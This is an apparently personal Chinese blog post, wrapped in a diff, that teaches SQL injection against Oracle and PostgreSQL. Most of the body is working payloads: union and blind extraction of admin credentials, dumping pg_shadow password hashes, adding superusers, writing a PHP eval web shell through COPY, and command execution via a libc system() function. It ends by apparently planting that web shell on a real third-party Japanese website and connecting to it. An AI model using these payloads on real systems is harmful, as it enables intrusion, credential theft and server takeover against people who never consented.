@@ -1,0 +1,354 @@
+<!DOCTYPE html><html lang="zh-CN "><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hongxiaodou || orcale&amp;postgersql注入</title>
+    <meta name="author" content="hongxiaodou">
+    <meta name="description" content="林深不见鹿，山巅自相逢 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/images/1.png">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/full-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<!-- hexo injector head_end start --><style>
+.body hanla:after {
+    content: ' ';
+    display: inline;
+    font-family: Arial;
+    font-size: 0.89em;
+}
+
+html code hanla,
+html pre hanla,
+html kbd hanla,
+html samp hanla {
+    display: none;
+}
+
+html ol > hanla,
+html ul > hanla {
+    display: none;
+}
+</style><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+    <div id="loading" style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent" style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#a3ddfb; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p><hanla></hanla>加载过慢请开启缓存<hanla></hanla>(浏览器默认开启)</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hongxiaodou</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>主页</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled">
+            </a-icon></span>
+            <span><hanla></hanla>Hongxiaodou</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled">
+                    </a-icon></div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;"><hanla></hanla>主页</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1><hanla></hanla>orcale&amp;postgersql<hanla></hanla>注入 </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled">
+            </a-icon></span>
+            2021/9/26
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/sql注入">
+                <span class="icon">
+                    <a-icon type="book" theme="filled">
+                </a-icon></span><hanla></hanla>
+                sql<hanla></hanla>注入
+            </a>
+        </span>
+        
+
+        
+    </div>
+
+    <div class="content" v-pre="">
+        <h2 id="oracle数据库介绍"><a href="#oracle数据库介绍" class="headerlink" title="oracle数据库介绍"></a><hanla></hanla>oracle<hanla></hanla>数据库介绍</h2><p><hanla></hanla>Oracle<hanla></hanla>数据库系统是美国<hanla></hanla>ORACLE<hanla></hanla>公司（甲骨文）提供的以分布式数据库为核心的一组软件产品。<br>  <span id="more"></span></p>
+<p><hanla></hanla>是目前世界上使用最为广泛的数据库管理系统。基于<hanla></hanla>“客户端<hanla></hanla>/<hanla></hanla>服务器”<hanla></hanla>模式结构，客户端应用程序<br>与用户交互，接收用户信息，并向服务器发送请求，服务器系统负责管理数 据信息和各种操作数据的活动。<br>特点</p>
+<p>1 支持多用户、大事务量的处理<br><hanla></hanla>2 数据安全性和完整性的有效控制<br><hanla></hanla>3 支持分布式数据处理<br><hanla></hanla>4 移植性强  </p>
+<h2 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h2><p>判断注入<br><hanla></hanla>and 1=1<br>and 1=2<br><hanla></hanla>判断<hanla></hanla>oracle<hanla></hanla>数据库<br><hanla></hanla>and exists(select * from dual)<br>and exists(select * from user_tables)  </p>
+<h2 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h2><p><hanla></hanla>order by 11  返回正常<br><hanla></hanla>order by 12    返回错误</p>
+<h2 id="获取数据类型不匹配的列"><a href="#获取数据类型不匹配的列" class="headerlink" title="获取数据类型不匹配的列"></a>获取数据类型不匹配的列</h2><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,null,null,null,null,null,null,null,null,null,null from dual</p>
+<p>在每列上逐个用数字代替 如果返回正常说明该列为数字类型，反之则为非数字类型。<br>也可以逐个用引号引起来如：<br>‘null’,null…from dual, 返回正常说明该列为字符类型，反之为非数字类型</p>
+<h2 id="获取基本信息"><a href="#获取基本信息" class="headerlink" title="获取基本信息"></a>获取基本信息</h2><p>获取数据库版本<br><hanla></hanla>(select banner from sys.v_$version where rownum=1)<br><hanla></hanla>获取操作系统版本<br><hanla></hanla>( select member from v$logfile where rownum=1)<br><hanla></hanla>获取连接数据库的当前用户<br><hanla></hanla>( select SYS_CONTEXT (‘USERENV’,’CURRENT_USER’)from dual)<br><hanla></hanla>获取数据库<br><hanla></hanla>(select owner from all_tables where rownum=1)  </p>
+<h2 id="获取数据库版本"><a href="#获取数据库版本" class="headerlink" title="获取数据库版本"></a>获取数据库版本</h2><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,(select banner from sys.v_$version where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取操作系统版本"><a href="#获取操作系统版本" class="headerlink" title="获取操作系统版本"></a>获取操作系统版本</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,( select member from v$logfile where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取连接数据库的当前用户"><a href="#获取连接数据库的当前用户" class="headerlink" title="获取连接数据库的当前用户"></a>获取连接数据库的当前用户</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,( select SYS_CONTEXT (‘USERENV’,’CURRENT_USER’)from dual),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取第一个表"><a href="#获取第一个表" class="headerlink" title="获取第一个表"></a>获取第一个表</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,( select table_name from user_tables where rownum=1),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取第二个表"><a href="#获取第二个表" class="headerlink" title="获取第二个表"></a>获取第二个表</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,( select table_name from user_tables where rownum=1 and table_name&lt;&gt;’ACCESS$’),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取第三个表"><a href="#获取第三个表" class="headerlink" title="获取第三个表"></a>获取第三个表</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=100</a> union select null,( select table_name from user_tables where rownum=1 and table_name&lt;&gt;’ACCESS$’and table_name&lt;&gt;’ALERT_QT’),null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取第一个列名"><a href="#获取第一个列名" class="headerlink" title="获取第一个列名"></a>获取第一个列名</h3><p>假设我们得到管理员表名为：<br>admin<br><hanla></hanla>获取第一个列名<hanla></hanla>EMPLOYEE_ID</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100">http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100</a> union select null,(select column_name from user_tab_columns where table_name=’admin’ and rownum=1),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</p>
+<h3 id="获取第二个列名"><a href="#获取第二个列名" class="headerlink" title="获取第二个列名"></a>获取第二个列名</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100</a> union select null,(select column_name from user_tab_columns where table_name=’admin’ and rownum=1 and column_name&lt;&gt;’EMPLOYEE_ID’),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</p>
+<p><hanla></hanla>得到表名为<hanla></hanla>NAME</p>
+<h3 id="获取第三个列名"><a href="#获取第三个列名" class="headerlink" title="获取第三个列名"></a>获取第三个列名</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100"><hanla></hanla>http://192.168.1.210:8080/SqlInject/SqlTest.jsp?id=-100</a> union select null,(select column_name from user_tab_columns where table_name=’admin’ and rownum=1 and column_name&lt;&gt;’EMPLOYEE_ID’ and rownum=1 and column_name&lt;&gt;’NAME’),4,5,6 from dual,null,null,null,null,null,null,null,null,null from dual</p>
+<p><hanla></hanla>得到表名为<hanla></hanla>PASS</p>
+<p>获取数据库<br><hanla></hanla>union select 1,2,name,4,5,6 from admin<br>union select 1,2,pass,4,5,6 from admin</p>
+<h2 id="第二种注入方式"><a href="#第二种注入方式" class="headerlink" title="第二种注入方式"></a>第二种注入方式</h2><pre><code><hanla></hanla>判断一下数据库中的表，网址后加上：
+and (select count(*) from admin) &lt;&gt;0<hanla></hanla>返回正常，说明存在<hanla></hanla>admin<hanla></hanla>表。如果返回错误，
+可将<hanla></hanla>admin<hanla></hanla>改为<hanla></hanla>username、manager<hanla></hanla>等常用表名继续猜解
+
+判断该网站下有几个管理
+
+
+如果有多个的话，成功入侵的几率就会加大
+and (select count(*) from admin)=1，返回正常说明只有一个管理员
+
+指定表名获取列名
+and (select count(name) from admin)&gt;=0<hanla></hanla>返回正常，说明存在<hanla></hanla>name<hanla></hanla>字段
+
+获取列名
+and (select count(pass) from admin)&gt;=0<hanla></hanla>返回错误，说明不存在<hanla></hanla>pass<hanla></hanla>字段
+</code></pre>
+<h3 id="采用ascii码折半法猜解"><a href="#采用ascii码折半法猜解" class="headerlink" title="采用ascii码折半法猜解"></a><hanla></hanla>采用<hanla></hanla>ascii<hanla></hanla>码折半法猜解</h3><pre><code><hanla></hanla>管理员账号和密码
+判断管理员名字长度
+and (select count(*) from admin where length(name)&gt;=5)=1
+说明：length()<hanla></hanla>函数用于求字符串的长度，此处猜测用户名的长度和<hanla></hanla>5<hanla></hanla>比较，即猜测是否由<hanla></hanla>5<hanla></hanla>个字符组成
+
+and (select count(*) from admin where ascii(substr(name,1,1))&gt;=97)=1
+说明：substr()<hanla></hanla>函数用于截取字符串，ascii()<hanla></hanla>函数用于获取字符的<hanla></hanla>ascii<hanla></hanla>码，
+此处的意思是截取<hanla></hanla>name<hanla></hanla>字段的第一个字符，获取它的<hanla></hanla>ascii<hanla></hanla>码值，查询<hanla></hanla>ascii<hanla></hanla>码表可知<hanla></hanla>97<hanla></hanla>为字符<hanla></hanla>a
+
+&nbsp;&nbsp;and (select count(*) from admin where ascii(substr(name,2,1))&gt;=100)=1 
+结果为<hanla></hanla>100，即字符<hanla></hanla>d，重复上述过程，可以判断出帐号为<hanla></hanla>admin
+
+相同的方法猜解密码
+ and (select count(*) from admin where length(pwd)&gt;=8)=1，
+返回正常，即密码长度为<hanla></hanla>8，此时可以判断密码应该为明文
+
+&nbsp;&nbsp; and (select count(*) from admin where ascii(substr(pwd,1,1))&gt;=97)=1，
+返回正常，为字符<hanla></hanla>a
+
+and (select count(*) from admin where ascii(substr(pwd,2,1))&gt;=100)=1，
+返回正常，为字符<hanla></hanla>d
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+and (select count(*) from admin where ascii(substr(pwd,8,1))&gt;=56)=1，
+返回正常，为数字<hanla></hanla>8
+
+ 完成上述操作可以确定帐号为：
+admin<hanla></hanla>密码为:admin888
+打开<hanla></hanla>http://10.1.1.59/login.jsp，
+输入猜解出的用户名和密码
+</code></pre>
+<h1 id="postgresql介绍"><a href="#postgresql介绍" class="headerlink" title="postgresql介绍"></a><hanla></hanla>postgresql<hanla></hanla>介绍</h1><p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkYyqk"><img src="https://s3.jpg.cm/2021/09/26/IkYyqk.png" alt="IkYyqk.png"></a></p>
+<p><hanla></hanla>PostgreSQL<hanla></hanla>是以加州大学伯克利分校计算机系开发的 POSTGRES，现在已经更名为<hanla></hanla>PostgreSQL，<br><hanla></hanla>版本 4.2<hanla></hanla>为基础的对象关系型数据库管理系统（ORDBMS）。PostgreSQL<hanla></hanla>支持大部分 SQL<hanla></hanla>标准并<br>且提供了许多其他现代特性：复杂查询、外键、触发器、视图、事务完整性、MVCC。同样，PostgreSQL<br> 可以用许多方法扩展，比如， 通过增加新的数据类型、函数、操作符、聚集函数、索引。免费使用、修改<br>、和分发 PostgreSQL，不管是私用、商用、还是学术研究使用</p>
+<h2 id="postgresql数据库注入常用语法"><a href="#postgresql数据库注入常用语法" class="headerlink" title="postgresql数据库注入常用语法"></a><hanla></hanla>postgresql<hanla></hanla>数据库注入常用语法</h2><h4 id="判断是否为postgresql数据库"><a href="#判断是否为postgresql数据库" class="headerlink" title="判断是否为postgresql数据库"></a><hanla></hanla>判断是否为<hanla></hanla>postgresql<hanla></hanla>数据库</h4><p><hanla></hanla>+and+1::int=1–<br><a target="_blank" rel="noopener" href="http://mysql.sql.com/sql.php?id=1+and+1::int=1--">http://mysql.sql.com/sql.php?id=1+and+1::int=1--</a></p>
+<h4 id="判断数据库版本信息"><a href="#判断数据库版本信息" class="headerlink" title="判断数据库版本信息"></a>判断数据库版本信息</h4><p><hanla></hanla>+and+1=cast(version() as int)–</p>
+<h4 id="判断当前用户"><a href="#判断当前用户" class="headerlink" title="判断当前用户"></a>判断当前用户</h4><p><hanla></hanla>and 1=cast(user||123 as int)  </p>
+<h4 id="判断有多少字段"><a href="#判断有多少字段" class="headerlink" title="判断有多少字段"></a>判断有多少字段</h4><p><hanla></hanla>order by<br>union select null,null,null<br>union select null,user,null     </p>
+<h4 id="判断当前用户-1"><a href="#判断当前用户-1" class="headerlink" title="判断当前用户"></a>判断当前用户</h4><h4 id="判断数据库版本信息-1"><a href="#判断数据库版本信息-1" class="headerlink" title="判断数据库版本信息"></a>判断数据库版本信息</h4><p><hanla></hanla>union select null,version(),null–</p>
+<h4 id="判断用户权限"><a href="#判断用户权限" class="headerlink" title="判断用户权限"></a>判断用户权限</h4><p><hanla></hanla>union+select+null,current_schema(),null</p>
+<h4 id="判断当前数据库名称"><a href="#判断当前数据库名称" class="headerlink" title="判断当前数据库名称"></a>判断当前数据库名称</h4><p><hanla></hanla>union+select+null,current_database(),null</p>
+<h4 id="判断当前表名"><a href="#判断当前表名" class="headerlink" title="判断当前表名"></a>判断当前表名</h4><p><hanla></hanla>union+select+null,relname,null from pg_stat_user_tables</p>
+<h4 id="读取每个表的列名"><a href="#读取每个表的列名" class="headerlink" title="读取每个表的列名"></a>读取每个表的列名</h4><p><hanla></hanla>union+select+null,column_name,null+from+information_schema.columns+where+table_name=’<hanla></hanla>表名’ </p>
+<h4 id="列字段内容"><a href="#列字段内容" class="headerlink" title="列字段内容"></a>列字段内容</h4><p><hanla></hanla>+union+select+null,name||pass,null+from+admin<br><hanla></hanla>查看<hanla></hanla>postgresql<hanla></hanla>数据库的账号密码<br><hanla></hanla>+union+select+null,usename||chr(124)||passwd,null+from+pg_shadow</p>
+<h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p><hanla></hanla>mysql root<hanla></hanla>在<hanla></hanla>windows 权限很高<br><hanla></hanla>在<hanla></hanla>linux<hanla></hanla>只是服务用户权限</p>
+<p>posgersql  posrgres 具有写入根目录权限</p>
+<p><hanla></hanla>sqlserver<hanla></hanla>默认端口号为：1433<br>oracle 默认端口号为：1521<br>DB2 默认端口号为：5000<br><hanla></hanla>PostgreSQL<hanla></hanla>默认端口号为：5432<br>mysql：3306<br>redis: 6379  </p>
+<h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户;"></a>创建用户;</h4><p>create+user+seven+with+superuser+password+’seven’–<br><hanla></hanla>修改<hanla></hanla>postgres<hanla></hanla>的用户密码为<hanla></hanla>123456<br>;alter+user+postgres+with+password+’123456’–  </p>
+<h4 id="postgresql写shell"><a href="#postgresql写shell" class="headerlink" title="postgresql写shell"></a><hanla></hanla>postgresql<hanla></hanla>写<hanla></hanla>shell</h4><p><hanla></hanla>直接拿<br><hanla></hanla>shell</p>
+<pre><code><hanla></hanla>http://127.0.0.1/sql.php?id=1;create table shell(shell text not null);
+http://127.0.0.1/sql.php?id=1;insert into shell values($$<!--?php @eval($_POST[cracer]);?-->$$); 
+http://127.0.0.1/sql.php?id=1;copy shell(shell) to '/var/www/html/shell.php';
+
+另一种方法：
+;copy (select '$$<!--?php @eval($_POST[cracer]);?-->$$') to 'c:/inetpub/wwwroot/mysql-sql/ddd.php'
+读取文件前<hanla></hanla>20<hanla></hanla>行
+pg_read_file('/etc/passwd',1,20)
+</code></pre>
+<h4 id="创建system函数"><a href="#创建system函数" class="headerlink" title="创建system函数"></a><hanla></hanla>创建<hanla></hanla>system<hanla></hanla>函数</h4><pre><code><hanla></hanla>用于版本大于<hanla></hanla>8<hanla></hanla>的数据库  
+创建一个<hanla></hanla>system<hanla></hanla>的函数：  
+create FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6',   'system' LANGUAGE 'C' STRICT  
+创建一个输出表：  
+create table stdout(id serial, system_out text)  
+执行<hanla></hanla>shell，  
+输出到输出表内：  
+select system('uname -a &gt; /tmp/test')  
+copy 输出的内容到表里面；  
+COPY stdout(system_out) FROM '/tmp/test'  
+从输出表内读取执行后的回显，判断是否执行成功  
+union all select NULL,(select stdout from system_out order by id   desc),NULL limit 1 offset 1–- 
+</code></pre>
+<h4 id="数据库备份还原"><a href="#数据库备份还原" class="headerlink" title="数据库备份还原"></a>数据库备份还原</h4><pre><code>备份数据库
+pg_dump -O -h 168.192.0.5 -U postgres mdb &gt;c:\mdb.sql”
+pg_dump -O -h 192.168.0.5 -U dbowner -w -p 5432 SS &gt;SS.sql 
+这个是远程备份数据库备份到本地来
+还原数据库
+psql -h localhost -U postgres -d mdb 
+</code></pre>
+<p>例如</p>
+<p>‘      报错<br><hanla></hanla>and 1=1 返回正常<br><hanla></hanla>and 1=2 返回错误</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkYhCi"><img src="https://s3.jpg.cm/2021/09/26/IkYhCi.png" alt="IkYhCi.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkYKr8"><img src="https://s3.jpg.cm/2021/09/26/IkYKr8.png" alt="IkYKr8.png"></a></p>
+<p>and 1=cast(version() as int)  获取数据库版本信息系统信息  </p>
+<p><hanla></hanla>and 1=cast(user||123 as int)  获取当前用户名称     postgres<hanla></hanla>用户相当于<hanla></hanla>root<hanla></hanla>用户权限  </p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkYCdw"><img src="https://s3.jpg.cm/2021/09/26/IkYCdw.png" alt="IkYCdw.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkY2TO"><img src="https://s3.jpg.cm/2021/09/26/IkY2TO.png" alt="IkY2TO.png"></a></p>
+<p><hanla></hanla>;create table ccc(w text not null);  创建表<hanla></hanla>x</p>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkY9He"><img src="https://s3.jpg.cm/2021/09/26/IkY9He.png" alt="IkY9He.png"></a></p>
+<p><hanla></hanla>向<hanla></hanla>x<hanla></hanla>表中插入一句话木马</p>
+<pre><code>  ;insert into ccc values($$&lt;?php @eval($_POST[cracer]);?&gt;$$);  
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://imagelol.com/image/IkYTfy"><img src="https://s3.jpg.cm/2021/09/26/IkYTfy.png" alt="IkYTfy.png"></a></p>
+<p>导出一句话：</p>
+<pre><code><hanla></hanla>;copy ccc(w) to $$/home/kasugai_tochi/public_html/script/cracer.php$$; 
+ 将一句话木马保存为<hanla></hanla>cracer.php<hanla></hanla>文件
+
+菜刀连接
+http://www.kasugai-tochi.jp/script/cracer.php
+</code></pre>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2021 Hongxiaodou
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled"></a-icon></span>
+            @hongxiaodou
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> &amp; <a target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+
+
+</body></html>
